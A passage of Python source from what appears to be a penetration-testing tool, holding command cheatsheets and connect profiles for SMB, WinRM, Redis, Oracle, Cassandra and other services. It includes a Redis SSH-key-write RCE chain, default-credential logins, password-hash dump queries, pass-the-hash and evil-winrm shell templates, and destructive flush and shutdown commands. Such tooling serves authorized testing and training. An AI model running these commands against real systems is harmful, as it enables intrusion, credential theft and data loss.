                 "Read all fields of a hash"),
                ("CONFIG GET *",
                 "All server config (dir / dbfilename / requirepass)"),
                ("CONFIG GET requirepass",
                 "Auth state — empty = no password"),
                ("CONFIG SET dir /var/lib/redis/.ssh",
                 "Pivot 1/3: set save dir to victim ~/.ssh"),
                ("CONFIG SET dbfilename authorized_keys",
                 "Pivot 2/3: rename dump file"),
                ("SET pwn \"\\n\\nssh-rsa AAAA... attacker\\n\\n\"",
                 "Pivot 3/3: write SSH pubkey as key value"),
                ("SAVE",
                 "Flush to disk (triggers the RCE chain)"),
                ("CLUSTER NODES",
                 "Cluster topology (if clustered)"),
                ("quit",
                 "Exit redis-cli"),
            ],
        },
        # ── STEP 3 / Fase 1: expanded coverage ──────────────────────
        # 12 additional datastores commonly found on real engagements.
        # All entries are CHEATSHEETS ONLY — no Connect-dialog actions
        # yet (planned for STEP 3.1 / 3.2 in a future pacchetto).
        # The 📋 CMDS button in the Ports panel becomes available
        # for these services through _cheatsheet_key_for() below.
        "elasticsearch": {
            "title": "Elasticsearch",
            "intro": ("HTTP REST API on port 9200 (data) and 9300 "
                      "(transport).  Vanilla ES < 8.x has NO auth "
                      "by default — try the URLs below first.  "
                      "Add `-u user:pass` to curl if auth enabled."),
            "commands": [
                ("curl http://<host>:9200/",
                 "Server welcome + version + cluster name"),
                ("curl http://<host>:9200/_cat/indices?v",
                 "List indices (table)"),
                ("curl http://<host>:9200/_cat/health?v",
                 "Cluster health (green/yellow/red)"),
                ("curl http://<host>:9200/_cat/nodes?v",
                 "List nodes (host names, roles)"),
                ("curl http://<host>:9200/<index>/_search?pretty&size=10",
                 "Sample 10 docs from an index"),
                ("curl 'http://<host>:9200/<index>/_search?pretty&q=*'",
                 "Search across an index (query string)"),
                ("curl http://<host>:9200/_cluster/state?pretty",
                 "Full cluster state JSON"),
                ("curl http://<host>:9200/_cluster/settings?pretty",
                 "Cluster settings (transient + persistent)"),
                ("curl http://<host>:9200/_security/user",
                 "List users (auth-enabled instance, 7.x+)"),
                ("curl http://<host>:9200/_nodes/_all/_all?pretty",
                 "All node info (paths, plugins, settings)"),
                ("# CVE-2014-3120 / CVE-2015-1427 RCE via groovy/MVEL "
                 "scripting (ES < 1.4.3) — search 'searchsploit "
                 "elasticsearch'", ""),
                ("# Older ES 1.x had _shutdown endpoint — try "
                 "`curl -XPOST http://host:9200/_shutdown`", ""),
            ],
        },
        "memcached": {
            "title": "Memcached",
            "intro": ("Text-mode protocol on port 11211 (TCP/UDP).  "
                      "NO auth by default.  UDP variant is amplifier-"
                      "abusable (CVE-2018-1000115).  Pipe commands "
                      "via nc — the server replies one line at a time."),
            "commands": [
                ("echo 'version' | nc <host> 11211",
                 "Server version"),
                ("echo 'stats' | nc <host> 11211",
                 "Full server statistics (uptime, items, bytes)"),
                ("echo 'stats settings' | nc <host> 11211",
                 "Server settings (max conns, max item size)"),
                ("echo 'stats items' | nc <host> 11211",
                 "Per-slab item statistics"),
                ("echo 'stats slabs' | nc <host> 11211",
                 "Memory slabs allocation"),
                ("echo 'stats cachedump <slab_id> 0' | nc <host> 11211",
                 "List all keys in a slab (slab_id from stats items)"),
                ("echo 'get <key>' | nc <host> 11211",
                 "Retrieve value of a specific key"),
                ("echo 'flush_all' | nc <host> 11211",
                 "WIPE the entire cache (DESTRUCTIVE — lab only)"),
                ("echo 'set hello 0 60 5\\r\\nworld' | nc <host> 11211",
                 "Write a key (TTL=60s, length=5, value=world)"),
                ("# UDP amplifier abuse: ban'/etc/memcached.conf' "
                 "'-l 127.0.0.1' + restart to mitigate", ""),
            ],
        },
        "couchdb": {
            "title": "CouchDB",
            "intro": ("HTTP REST + JSON.  Port 5984.  Admin Party "
                      "(no auth) was the default until 3.x.  "
                      "CVE-2017-12635 / CVE-2017-12636 / CVE-2022-24706 "
                      "are all RCE chains on un-patched 1.x/2.x."),
            "commands": [
                ("curl http://<host>:5984/",
                 "Welcome + version (1.x: 'couchdb welcome', 2.x+: "
                 "JSON with version field)"),
                ("curl http://<host>:5984/_all_dbs",
                 "List all databases (JSON array)"),
                ("curl http://<host>:5984/<db>/_all_docs?limit=10",
                 "List 10 doc IDs from a database"),
                ("curl 'http://<host>:5984/<db>/_all_docs?include_docs=true&limit=10'",
                 "Same + full doc bodies"),
                ("curl http://<host>:5984/<db>/<doc_id>",
                 "Fetch a single document by ID"),
                ("curl http://<host>:5984/_users/_all_docs",
                 "List user accounts (may require admin auth)"),
                ("curl http://<host>:5984/_config  # CouchDB 1.x",
                 "Full server config (1.x only — JSON)"),
                ("curl http://<host>:5984/_node/_local/_config",
                 "Server config (CouchDB 2.x+)"),
                ("curl http://<host>:5984/_membership",
                 "Cluster membership (2.x+)"),
                ("# CVE-2017-12635: privilege escalation via "
                 "duplicate JSON keys in PUT /_users/...", ""),
                ("# CVE-2022-24706: pre-auth RCE in clustered setup "
                 "via Erlang cookie — searchsploit couchdb", ""),
            ],
        },
        "influxdb": {
            "title": "InfluxDB",
            "intro": ("Time-series DB.  HTTP API on port 8086.  "
                      "v1.x uses InfluxQL (SQL-like); v2.x uses Flux. "
                      "v1 had no auth by default until 1.3; v2 always "
                      "requires token.  CVE-2019-20933 (1.7.6-) is "
                      "an auth bypass via empty username."),
            "commands": [
                ("curl http://<host>:8086/ping",
                 "Health check (returns 204 on OK)"),
                ("# === InfluxDB 1.x ===", ""),
                ("curl 'http://<host>:8086/query?q=SHOW DATABASES'",
                 "List databases (v1)"),
                ("curl 'http://<host>:8086/query?q=SHOW USERS'",
                 "List users (v1, admin auth)"),
                ("curl 'http://<host>:8086/query?db=<db>&q=SHOW MEASUREMENTS'",
                 "List measurements (= tables) in a database"),
                ("curl 'http://<host>:8086/query?db=<db>&q=SHOW SERIES'",
                 "List all time-series in a db"),
                ("curl --data-urlencode 'q=SELECT * FROM <m> LIMIT 10' "
                 "'http://<host>:8086/query?db=<db>'",
                 "Sample data from a measurement"),
                ("# === InfluxDB 2.x ===", ""),
                ("curl http://<host>:8086/health",
                 "Health endpoint (JSON)"),
                ("curl -H 'Authorization: Token <token>' "
                 "http://<host>:8086/api/v2/buckets",
                 "List buckets (= databases)"),
                ("curl -H 'Authorization: Token <token>' "
                 "http://<host>:8086/api/v2/orgs",
                 "List organizations"),
            ],
        },
        "clickhouse": {
            "title": "ClickHouse",
            "intro": ("Columnar OLAP DB.  HTTP interface on 8123, "
                      "native protocol on 9000.  Default user is "
                      "'default' with empty password.  HTTP is the "
                      "simplest entry point (curl)."),
            "commands": [
                ("curl 'http://<host>:8123/?query=SELECT version()'",
                 "Server version"),
                ("curl 'http://<host>:8123/?query=SHOW DATABASES'",
                 "List databases"),
                ("curl 'http://<host>:8123/?query=SHOW TABLES FROM <db>'",
                 "List tables in a database"),
                ("curl 'http://<host>:8123/?query=DESCRIBE TABLE <db>.<t>'",
                 "Show table schema"),
                ("curl 'http://<host>:8123/?query=SELECT * FROM "
                 "<db>.<t> LIMIT 10 FORMAT Pretty'",
                 "Sample rows (Pretty format = human-readable)"),
                ("curl 'http://<host>:8123/?query=SELECT name, "
                 "password_sha256_hex FROM system.users'",
                 "Dump user hashes (default/admin only)"),
                ("curl 'http://<host>:8123/?query=SELECT * FROM "
                 "system.processes'",
                 "Active queries (process list)"),
                ("curl 'http://<host>:8123/?query=SELECT * FROM "
                 "system.settings WHERE changed = 1'",
                 "Server settings (changed from default)"),
                ("curl -u <user>:<pass> "
                 "'http://<host>:8123/?query=SELECT 1'",
                 "Test credentials (auth via Basic)"),
                ("# Native CLI: clickhouse-client --host <host> "
                 "--port 9000 -u <user> --password <pass>", ""),
            ],
        },
        "rethinkdb": {
            "title": "RethinkDB",
            "intro": ("Driver protocol on port 28015 (binary).  Web "
                      "Admin UI usually on 8080.  No CLI on Kali by "
                      "default — use Python driver `pip install "
                      "rethinkdb` then python3 -i.  No-auth by "
                      "default until 2.3."),
            "commands": [
                ("pip install rethinkdb  # one-time setup",
                 "Install Python driver"),
                ("python3",
                 "Start Python REPL"),
                ("import rethinkdb; r=rethinkdb.RethinkDB()",
                 "Import driver"),
                ("c = r.connect(host='<host>', port=28015)",
                 "Open connection (add user=, password= if auth)"),
                ("list(r.db_list().run(c))",
                 "List databases"),
                ("list(r.db('<db>').table_list().run(c))",
                 "List tables in a database"),
                ("list(r.db('<db>').table('<table>').limit(10).run(c))",
                 "Sample 10 rows"),
                ("r.db('rethinkdb').table('users').run(c)",
                 "List user accounts (auth-enabled)"),
                ("r.db('rethinkdb').table('server_status').run(c)",
                 "Server status info"),
                ("c.close()",
                 "Close connection"),
                ("# Admin web UI: http://<host>:8080/ — no auth in "
                 "old versions, full DB management UI", ""),
            ],
        },
        "cassandra": {
            "title": "Cassandra (CQL)",
            "intro": ("Wide-column NoSQL.  CQL native protocol on "
                      "9042, Thrift legacy on 9160.  Default user "
                      "cassandra:cassandra (often unchanged in lab "
                      "boxes).  Client: cqlsh (apt-get install "
                      "cassandra-tools on Debian/Kali)."),
            "commands": [
                ("cqlsh <host> 9042 -u cassandra -p cassandra",
                 "Connect with default creds"),
                ("DESC KEYSPACES;",
                 "List keyspaces (= databases)"),
                ("USE <keyspace>;",
                 "Switch to a keyspace"),
                ("DESC TABLES;",
                 "List tables in current keyspace"),
                ("DESC TABLE <table>;",
                 "Show table schema"),
                ("SELECT * FROM <table> LIMIT 10;",
                 "Sample 10 rows"),
                ("LIST USERS;",
                 "List user accounts (legacy syntax)"),
                ("SELECT * FROM system_auth.roles;",
                 "Roles + auth hashes (modern Cassandra 3.x+)"),
                ("SELECT * FROM system.peers;",
                 "Other nodes in the cluster"),
                ("SELECT release_version FROM system.local;",
                 "Server version"),
                ("EXPAND ON;",
                 "Toggle vertical row output (readable)"),
                ("exit",
                 "Exit cqlsh"),
            ],
        },
        "neo4j": {
            "title": "Neo4j",
            "intro": ("Graph database.  Bolt binary protocol on 7687, "
                      "HTTP on 7474.  Default neo4j:neo4j (forced "
                      "password change on first login).  Client: "
                      "cypher-shell (bundled with Neo4j); HTTP via "
                      "curl as fallback."),
            "commands": [
                ("cypher-shell -a bolt://<host>:7687 -u neo4j -p neo4j",
                 "Connect via Bolt"),
                ("CALL dbms.components();",
                 "Server version + edition"),
                ("CALL db.labels();",
                 "List node labels (= entity types)"),
                ("CALL db.relationshipTypes();",
                 "List relationship types"),
                ("MATCH (n) RETURN count(n);",
                 "Total node count"),
                ("MATCH (n) RETURN n LIMIT 10;",
                 "Sample 10 nodes"),
                ("MATCH (n:<Label>) RETURN n LIMIT 10;",
                 "Sample nodes of a specific label"),
                ("CALL dbms.security.listUsers();",
                 "List users (admin only)"),
                ("CALL dbms.security.listRoles();",
                 "List roles + permissions"),
                ("# HTTP fallback (no cypher-shell available):", ""),
                ("curl -u neo4j:neo4j http://<host>:7474/db/data/",
                 "REST API root (Neo4j 3.x; deprecated in 4.x)"),
                ("curl -u neo4j:neo4j -X POST "
                 "http://<host>:7474/db/neo4j/tx/commit -H "
                 "'Content-Type: application/json' -d "
                 "'{\"statements\":[{\"statement\":\"MATCH (n) "
                 "RETURN n LIMIT 5\"}]}'",
                 "Run a Cypher query via HTTP (Neo4j 4.x+)"),
                (":exit",
                 "Exit cypher-shell"),
            ],
        },
        "oracle": {
            "title": "Oracle Database (TNS)",
            "intro": ("Enterprise RDBMS.  TNS listener on port 1521 "
                      "(also 1522, 1526, 2483, 2484).  Default SIDs: "
                      "ORCL, XE, ORACLE.  Default DBA creds: "
                      "sys/change_on_install, system/manager, "
                      "scott/tiger.  Client: sqlplus (Oracle Instant "
                      "Client install) or impacket-ssrf scripts."),
            "commands": [
                ("# Recon: SID enumeration first (no creds needed)",
                 ""),
                ("nmap -p 1521 --script oracle-sid-brute <host>",
                 "Brute-force SIDs (CVE-2012-1675 TNS Poison)"),
                ("sqlplus system/manager@<host>:1521/XE",
                 "Connect with default DBA creds"),
                ("SELECT BANNER FROM v$version;",
                 "Server version + edition"),
                ("SELECT username FROM all_users;",
                 "List user accounts"),
                ("SELECT username, account_status FROM dba_users;",
                 "Users + lock/expire status (DBA)"),
                ("SELECT username, password FROM sys.user$;",
                 "Old-style password hashes (10g and earlier)"),
                ("SELECT name, password, spare4 FROM sys.user$;",
                 "11g+ hashes (spare4 = SHA-1)"),
                ("SELECT * FROM session_privs;",
                 "Privileges of current session"),
                ("SELECT table_name FROM all_tables WHERE owner='<USER>';",
                 "List tables owned by a user"),
                ("SELECT * FROM <owner>.<table> WHERE rownum <= 10;",
                 "Sample 10 rows (Oracle uses ROWNUM, not LIMIT)"),
                ("SELECT * FROM v$pwfile_users;",
                 "Users with SYSDBA / SYSOPER"),
                ("exit;",
                 "Exit sqlplus"),
            ],
        },
        "db2": {
            "title": "IBM DB2",
            "intro": ("IBM enterprise RDBMS.  Default port 50000 "
                      "(non-SSL), 50001 (SSL).  Default DBA: "
                      "db2inst1 with same name as password on many "
                      "installs.  Client: db2 CLP (db2cli) — "
                      "install IBM Data Server Client."),
            "commands": [
                ("db2 CONNECT TO <db> USER db2inst1 USING db2inst1",
                 "Connect (default DBA creds attempt)"),
                ("db2 \"SELECT * FROM SYSCAT.TABLES "
                 "FETCH FIRST 10 ROWS ONLY\"",
                 "List tables (DB2 uses FETCH FIRST, not LIMIT)"),
                ("db2 LIST DATABASE DIRECTORY",
                 "List databases on this server"),
                ("db2 LIST TABLES FOR ALL",
                 "List all tables (current connection)"),
                ("db2 LIST TABLESPACES",
                 "List tablespaces"),
                ("db2 LIST APPLICATIONS",
                 "Active connections"),
                ("db2 \"SELECT NAME, CREATETIME FROM SYSCAT.SCHEMATA\"",
                 "List schemas"),
                ("db2 \"SELECT AUTHID FROM SYSCAT.DBAUTH\"",
                 "List authorized users"),
                ("db2 GET DBM CFG",
                 "Database manager config"),
                ("db2 quit",
                 "Exit db2 CLP"),
            ],
        },
        "hive": {
            "title": "Apache Hive",
            "intro": ("Hadoop SQL layer.  HiveServer2 on port 10000 "
                      "(Thrift JDBC).  Default no auth (anonymous "
                      "user 'anonymous'); some deployments use "
                      "Kerberos.  Client: beeline (apt install "
                      "hive — comes with Hadoop)."),
            "commands": [
                ("beeline -u 'jdbc:hive2://<host>:10000/default'",
                 "Connect anonymously"),
                ("beeline -u 'jdbc:hive2://<host>:10000/default' "
                 "-n <user> -p <pass>",
                 "Connect with credentials"),
                ("SHOW DATABASES;",
                 "List databases (Hive metastore)"),
                ("USE <db>;",
                 "Switch database"),
                ("SHOW TABLES;",
                 "List tables in current db"),
                ("DESCRIBE <table>;",
                 "Show table schema"),
                ("DESCRIBE EXTENDED <table>;",
                 "Show schema + storage location (HDFS path leak)"),
                ("SELECT * FROM <table> LIMIT 10;",
                 "Sample rows"),
                ("SHOW FUNCTIONS;",
                 "List built-in + custom UDFs"),
                ("CREATE TEMPORARY FUNCTION pwn AS "
                 "'<package>.<UDFclass>';",
                 "Load custom Java UDF (RCE chain if HDFS-writable)"),
                ("!quit",
                 "Exit beeline"),
            ],
        },
        "arangodb": {
            "title": "ArangoDB",
            "intro": ("Multi-model DB (docs + graph + key-value).  "
                      "HTTP API on port 8529.  Default root with "
                      "empty password before 3.0.  AQL is the query "
                      "language.  Web UI also on 8529 (browser)."),
            "commands": [
                ("curl http://<host>:8529/_api/version",
                 "Server version"),
                ("curl http://<host>:8529/_api/database/current",
                 "Current default DB info"),
                ("curl http://<host>:8529/_api/database",
                 "List databases (root auth required)"),
                ("curl http://<host>:8529/_db/<db>/_api/collection",
                 "List collections in a database"),
                ("curl http://<host>:8529/_db/<db>/_api/collection/"
                 "<coll>/properties",
                 "Collection properties (count, type, indexes)"),
                ("curl -X POST http://<host>:8529/_db/<db>/_api/cursor "
                 "-d '{\"query\":\"FOR doc IN <coll> LIMIT 10 "
                 "RETURN doc\"}'",
                 "Sample 10 docs via AQL"),
                ("curl http://<host>:8529/_api/user",
                 "List users (root auth)"),
                ("curl -u root: http://<host>:8529/_api/user",
                 "Same — with empty password as root"),
                ("curl http://<host>:8529/_admin/server/availability",
                 "Server availability check"),
                ("# arangosh CLI:  arangosh --server.endpoint "
                 "tcp://<host>:8529 --server.username root", ""),
            ],
        },
    }

    # ── Cheatsheet alias map (canonical-key lookup) ─────────────────
    # Hardcoded fallback used when the YAML profile loader (STEP 5)
    # fails or finds no files.  The YAML overlay at the bottom of
    # this module REPLACES this dict at import time when profiles/
    # db_profiles/ is populated (the bundled defaults, generated by
    # tmp/_migrate_cheatsheets_to_yaml.py, are always present).
    #
    # Keys = lowercased service-name variants that nmap -sV / our
    # canonicaliser might emit.  Values = canonical key into
    # _CONNECT_CHEATSHEETS.  Keep this in sync with the YAML
    # `aliases:` field for each profile.
    _CHEATSHEET_ALIAS_MAP = {
        # Tier 1
        "mysql": "mysql",     "mariadb": "mysql",
        "postgresql": "postgresql", "postgres": "postgresql",
        "mssql": "mssql",     "ms-sql-s": "mssql",
        "ms-sql-m": "mssql",
        "mongodb": "mongodb", "mongo": "mongodb",
        "redis": "redis",
        # Tier 2 — STEP 3 Fase 1 expansion
        "elasticsearch": "elasticsearch", "elastic": "elasticsearch",
        "elastic-search": "elasticsearch",
        "memcached": "memcached", "memcache": "memcached",
        "couchdb": "couchdb", "couch": "couchdb",
        "influxdb": "influxdb", "influx": "influxdb",
        "clickhouse": "clickhouse",
        "rethinkdb": "rethinkdb", "rethink": "rethinkdb",
        "cassandra": "cassandra", "cassandra-cql": "cassandra",
        "neo4j": "neo4j", "bolt": "neo4j",
        "oracle": "oracle", "oracle-tns": "oracle",
        "tns": "oracle", "oracle-tnslsnr": "oracle",
        "db2": "db2", "ibm-db2": "db2", "db2as": "db2",
        "hive": "hive", "hiveserver2": "hive", "hive2": "hive",
        "arangodb": "arangodb", "arango": "arangodb",
    }

    @classmethod
    def _cheatsheet_key_for(cls, svc: str):
        """Normalise a service identifier to a cheatsheet key.

        Returns the canonical key into ``_CONNECT_CHEATSHEETS`` when
        one exists, or None when the service has no cheatsheet (so
        the per-port "📋 CMDS" button stays hidden).

        The class attribute ``_CHEATSHEET_ALIAS_MAP`` drives the
        lookup — it's populated either from YAML (STEP 5 default)
        or from the hardcoded fallback above when YAML loading
        fails.  Either way the same dict-lookup runs at call-time.
        """
        s = (svc or "").strip().lower()
        if not s:
            return None
        return cls._CHEATSHEET_ALIAS_MAP.get(s)

    # Service-name classes used for the banner-first canonicalization.
    _HTTPISH = {"http", "https", "http-proxy", "http-alt", "ssl/http",
                "microsoft-httpapi", "soap", "upnp", "rpcbind"}
    # Clear positive signals — when any of these tokens appears in the
    # banner we trust nmap's detection and do NOT override.
    _WEB_SERVER_TOKENS = ("apache", "nginx", "iis ", "microsoft-iis",
                          "lighttpd", "tomcat", "jetty", "caddy",
                          "kestrel", "gunicorn", "node.js", "express",
                          "werkzeug", "flask", "jboss", "weblogic",
                          "glassfish")
    _WINRM_TOKENS      = ("wsman", "winrm", "microsoft-httpapi")




    # ─── Target-generation / compat-flag plumbing ────────────────────────




    # Hash-aware connect templates — used when the chosen credential is a
    # hash (no cleartext password available). Only services that support
    # pass-the-hash are listed here; others fall back to the default template.
    _CONNECT_CMDS_HASH = {
        # netexec winrm supports PtH via -H; keeps Connect semantically a
        # "validate the service" action rather than opening an evil-winrm
        # shell behind the user's back.  Shell-on-PtH is exposed
        # explicitly via the shell_hash action.
        "winrm":   "netexec winrm {host} -u {user} -H {hash}",
        "smb":          "netexec smb {host} -u {user} -H {hash}",
        "microsoft-ds": "netexec smb {host} -u {user} -H {hash}",
        "netbios-ssn":  "netexec smb {host} -u {user} -H {hash}",
    }

    # Services whose protocol REJECTS anonymous/guest/null auth by
    # design.  The Connect dialog and _pick_best_cred both consult
    # this set so anonymous creds from the store (e.g. FTP anonymous)
    # don't pre-fill auth fields on services where they'd just trigger
    # LOGON_FAILURE.  Keep this list in sync with the identical set in
    # _connect_in_terminal() at the callsite — both enforce the same
    # rule to prevent user confusion.
    _NO_ANON_CONNECT_SERVICES = {
        "rdp", "ms-wbt-server",      # Windows RDP auth required
        "winrm",                     # WinRM rejects anonymous binds
        "mssql", "ms-sql-s",         # SQL Server auth required
        "mysql",                     # except anonymous@localhost (rare)
        "postgresql", "postgres",    # pg_hba blocks anonymous
        "vnc",                       # VNC has password auth
        "ldap",                      # AD rejects anon LDAP since 2003
        "ssh",                       # SSH protocol has no anon/guest
    }
    _ANON_USERNAMES = {
        "anonymous", "anon", "guest", "nobody", "",
    }

    # Services that REQUIRE a non-empty password by protocol design —
    # save-on-launch skips these when the user typed an empty password
    # field, since the login is guaranteed to fail (would clutter the
    # cred store with entries that can never work).
    #
    # NOTE on the exclusions:
    # • telnet / vnc are left out because empty password IS a legitimate
    #   auth path on those (IoT/router devices with blank pwd, VNC
    #   no-auth mode).
    # • redis / mongodb left out (password-only or no-auth modes).
    # • ldap is left out because empty pwd = anonymous bind (covered
    #   by the _NO_ANON_CONNECT_SERVICES filter via empty username).
    # • The dedicated FTP anonymous flow uses mode="anon" so it bypasses
    #   save-on-launch entirely; FTP authenticated mode (mode="auth")
    #   IS included here because empty pwd on auth-mode FTP fails.
    # • MySQL has the dedicated `empty_root` action (mode="anon") for
    #   the legacy root:empty case — mode="auth" with empty pwd is
    #   never legit and gets filtered.
    _REQUIRE_NONEMPTY_PASSWORD_SERVICES = {
        "ssh", "rdp", "winrm",
        "mssql", "ms-sql-s",
        "postgresql", "postgres",
        "http", "https", "http-proxy", "ssl/http", "http-alt",
        "mysql", "mariadb",
        "ftp", "ftps", "sftp",
    }


    # Anonymous / unauth templates — used when the user chooses "Anonymous".
    # For services where anonymous is not meaningful (RDP, WinRM) we fall
    # back to the normal template and surface the missing-cred warning.
    _CONNECT_CMDS_ANON = {
        "smb":          "smbclient -L //{host} -N",
        "microsoft-ds": "smbclient -L //{host} -N",
        "netbios-ssn":  "smbclient -L //{host} -N",
        # FTP anonymous: auto-login USER/PASS then drop to an INTERACTIVE
        # prompt.  We pipe the auth commands into ftp(1) and then `cat`
        # keeps stdin alive so the user can type `ls`, `get`, `pwd`, …
        # at the ftp> prompt.  Without this, stock `ftp -n host port`
        # lands in ftp> un-authenticated and every command bounces with
        # "530 Please login with USER and PASS."  Also sets passive mode
        # to avoid "Can't bind for data connection: Address already in
        # use" from stuck TIME_WAIT sockets on the active port.
        "ftp":          ("{ printf 'user anonymous anonymous@\\n"
                         "passive\\n'; cat; } | ftp -nv {host} {port}"),
        "http":         "curl -I -v http://{host}:{port}/",
        "https":        "curl -I -vk https://{host}:{port}/",
        "http-proxy":   "curl -I -v http://{host}:{port}/",
        "ssl/http":     "curl -I -vk https://{host}:{port}/",
        "redis":        "redis-cli -h {host} -p {port}",
        "mongodb":      "mongosh mongodb://{host}:{port}",
    }

    # Services that will NEVER accept anonymous — we require creds.
    _AUTH_REQUIRED = {"winrm", "rdp", "ms-wbt-server",
                      "mysql", "postgresql", "ms-sql-s", "mssql"}

    # ═══════════════════════════════════════════════════════════════════
    #  SERVICE PROFILES — per-service dialog intelligence
    # ═══════════════════════════════════════════════════════════════════
    # Each profile drives the CONNECT dialog: title, description, actions,
    # extra parameters, flag explanations, expected output, and common
    # errors with fixes.  Actions map to command templates.
    #
    # Placeholder tokens in templates:
    #   {host} {port} {user} {pass} {hash} + any extra field id.
    # "mode" declares what auth inputs the action expects:
    #   "anon"   → no username/password shown
    #   "auth"   → username + password required
    #   "hash"   → username + NTLM hash required
    #   "key"    → username + keyfile path required
    # ═══════════════════════════════════════════════════════════════════
    _SERVICE_PROFILES = {
        "smb": {
            "icon":  "📁",
            "title": "SMB / CIFS",
            "desc":  ("Windows file-sharing (also called CIFS). Ports 445 "
                      "(modern) and 139 (NetBIOS). Often enumerable without "
                      "credentials via the IPC$ null session."),
            "actions": [
                {"id":"enum_anon",   "label":"Enumerate shares (anonymous)",
                 "what":"Connects with NO credentials (null session) and lists "
                        "available shares. First thing to always try.",
                 "tpl":"smbclient -L //{host} -N",
                 "mode":"anon", "needs":[]},
                {"id":"enum_guest",  "label":"Enumerate shares (guest login)",
                 "what":"Logs in as the built-in 'guest' account with no "
                        "password. Often works on hardened hosts where the "
                        "anonymous null session is disabled but the guest "
                        "account is still enabled (common on Samba and on "
                        "non-DC Windows boxes).",
                 "tpl":"smbclient -L //{host} -U 'guest%'",
                 "mode":"anon", "needs":[]},
                {"id":"enum_auth",   "label":"Enumerate shares (with creds)",
                 "what":"Same as above but authenticated — shows shares the "
                        "user is allowed to see.",
                 "tpl":"smbclient -L //{host} -U '{user}%{pass}'",
                 "mode":"auth", "needs":[]},
                {"id":"enum_hash",   "label":"Enumerate shares (pass-the-hash)",
                 "what":"Uses the NTLM hash instead of a cleartext password. "
                        "Works when you have a hash dump.",
                 "tpl":"netexec smb {host} -u {user} -H {hash} --shares",
                 "mode":"hash", "needs":[]},
                {"id":"connect_share_anon","label":"Connect to a share (anonymous, interactive)",
                 "what":"Opens an interactive smb:\\> prompt as anonymous "
                        "(null session, no credentials).  Drops you at the "
                        "share's prompt — use 'ls', 'cd', 'get file', 'pwd', "
                        "'recurse ON' to walk the tree.  Works whenever the "
                        "target leaves a share readable to anonymous users "
                        "(very common on misconfigured boxes / CTF targets / "
                        "old Samba).  Requires the share name — run "
                        "'Enumerate shares (anonymous)' first if you don't "
                        "know what's exposed.",
                 "tpl":"smbclient //{host}/{share} -N",
                 "mode":"anon", "needs":["share"]},
                {"id":"connect_share","label":"Connect to a share (with credentials)",
                 "what":"Opens an interactive smb:\\> prompt. Use 'ls', "
                        "'get file', 'put file'. Requires share name.",
                 "tpl":"smbclient //{host}/{share} -U '{user}%{pass}'",
                 "mode":"auth", "needs":["share"]},
                {"id":"check_creds", "label":"Validate credentials",
                 "what":"Fast auth check with netexec — no interactive shell. "
                        "Shows (Pwn3d!) if the account is local admin.",
                 "tpl":"netexec smb {host} -u {user} -p '{pass}'",
                 "mode":"auth", "needs":[]},
            ],
            "extras": {
                "share": {"label":"Share name", "default":"",
                          "hint":"e.g. IPC$, SYSVOL, Users, C$ — case sensitive"},
            },
            "flags": {
                "-L":  "List shares, don't connect to one",
                "-N":  "No password (anonymous / null session)",
                "-U":  "Username (format user%password embeds creds)",
                "-H":  "NTLM hash for pass-the-hash authentication",
                "//host/share": "UNC path — double-slash is required",
            },
            "expect": ("A table like:\n    Sharename   Type   Comment\n"
                       "    ---------   ----   -------\n"
                       "    ADMIN$      Disk   Remote Admin\n"
                       "    IPC$        IPC    Remote IPC"),
            "errors": {
                "NT_STATUS_ACCESS_DENIED":
                    "Creds are wrong OR account lacks rights on this share.",
                "NT_STATUS_LOGON_FAILURE":
                    "Username or password is invalid.",
                "NT_STATUS_IO_TIMEOUT":
                    "Host unreachable on 445 — firewall, VPN, or VM stopped.",
                "NT_STATUS_BAD_NETWORK_NAME":
                    "That share name doesn't exist — run enum first.",
                "NT_STATUS_HOST_UNREACHABLE":
                    "No route to host — check your VPN/tun0.",
                "protocol negotiation failed":
                    "Server requires SMB signing — add --option='client min protocol=SMB2'.",
            },
        },

        "winrm": {
            "icon":  "🪟",
            "title": "WinRM — Windows Remote Management",
            "desc":  ("The Microsoft equivalent of SSH: port 5985 (HTTP) or "
                      "5986 (HTTPS). REQUIRES valid credentials — anonymous "
                      "is not supported. Often the cleanest path to SYSTEM "
                      "when the account is a local admin."),
            "actions": [
                # Default action: pure WinRM connect+validate via netexec.
                # Kept first so clicking CONNECT on a 5985 port does NOT
                # auto-launch evil-winrm (an exploitation tool that opens
                # a real shell behind the user's back).  Evil-winrm stays
                # available below as an explicit, well-labelled choice.
                {"id":"check_creds", "label":"Connect & validate credentials (netexec)",
                 "what":"Fast WinRM auth check — connects to the service "
                        "and reports whether the credential is accepted. "
                        "Shows (Pwn3d!) if the account can execute on "
                        "WinRM. No interactive shell is opened.",
                 "tpl":"netexec winrm {host} -u {user} -p '{pass}'",
                 "mode":"auth", "needs":[]},
                {"id":"shell_pw",    "label":"Open interactive shell via evil-winrm (password)",
                 "what":"Launches evil-winrm — a real PowerShell prompt on "
                        "the target. Exploitation tool, not a plain WinRM "
                        "client. Full file upload/download built in.",
                 "tpl":"evil-winrm -i {host} -P {port} -u {user} -p '{pass}'",
                 "mode":"auth", "needs":[]},
                {"id":"shell_hash",  "label":"Open interactive shell via evil-winrm (PtH)",
                 "what":"Same as above but authenticates with an NTLM hash.",
                 "tpl":"evil-winrm -i {host} -P {port} -u {user} -H {hash}",
                 "mode":"hash", "needs":[]},
                {"id":"oneshot",     "label":"Run one command (netexec, no shell)",
                 "what":"Executes a single command via netexec then exits.",
                 "tpl":"netexec winrm {host} -u {user} -p '{pass}' -x \"{cmd}\"",
                 "mode":"auth", "needs":["cmd"]},
            ],
            "extras": {
                "cmd": {"label":"Command", "default":"whoami /all",
                        "hint":"PowerShell or cmd — e.g. whoami, hostname, ipconfig"},
            },
            "flags": {
                "-i":  "Target IP / hostname",
                "-P":  "Port (5985 HTTP / 5986 HTTPS)",
                "-u":  "Username (domain\\user or user)",
                "-p":  "Password (single-quote to preserve special chars)",
                "-H":  "NTLM hash (pass-the-hash)",
                "-x":  "(netexec) run this command non-interactively",
            },
            "expect": ("Success: an 'Evil-WinRM PS C:\\Users\\{user}\\Documents>' "
                       "prompt, or netexec showing '[+] DOMAIN\\\\user:pass (Pwn3d!)'."),
            "errors": {
                "Error: An error of type":
                    "Usually wrong creds or user not in Remote Management Users group.",
                "Connection refused":
                    "WinRM service not running on target — verify the port.",
                "No route to host":
                    "Host down or firewall blocking 5985/5986.",
                "WSMan":
                    "Service error — target may need 'Enable-PSRemoting'.",
            },
        },

        "rdp": {
            "icon":  "🖥️",
            "title": "RDP — Remote Desktop",
            "desc":  ("Microsoft Remote Desktop Protocol. Port 3389 by default. "
                      "Opens a full graphical Windows session. Most servers "
                      "now require NLA (Network Level Auth) so creds are "
                      "validated before the GUI appears."),
